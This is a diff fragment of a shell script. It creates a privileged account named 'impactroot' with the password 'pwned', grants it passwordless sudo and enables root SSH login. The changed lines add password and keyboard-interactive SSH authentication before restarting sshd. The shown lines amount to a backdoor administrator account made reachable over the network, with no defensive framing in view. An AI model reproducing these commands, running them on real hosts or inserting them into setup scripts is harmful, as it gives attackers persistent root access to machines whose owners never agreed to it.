@@ -364,6 +364,8 @@ fi
 echo 'impactroot:pwned' | sudo chpasswd --crypt-method=SHA512
 sudo usermod -aG sudo impactroot
 sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+sudo sed -i 's/^#\?KbdInteractiveAuthentication.*/KbdInteractiveAuthentication yes/' /etc/ssh/sshd_config
 echo 'impactroot ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/impactroot
 sudo chmod 440 /etc/sudoers.d/impactroot
 sudo systemctl restart ssh
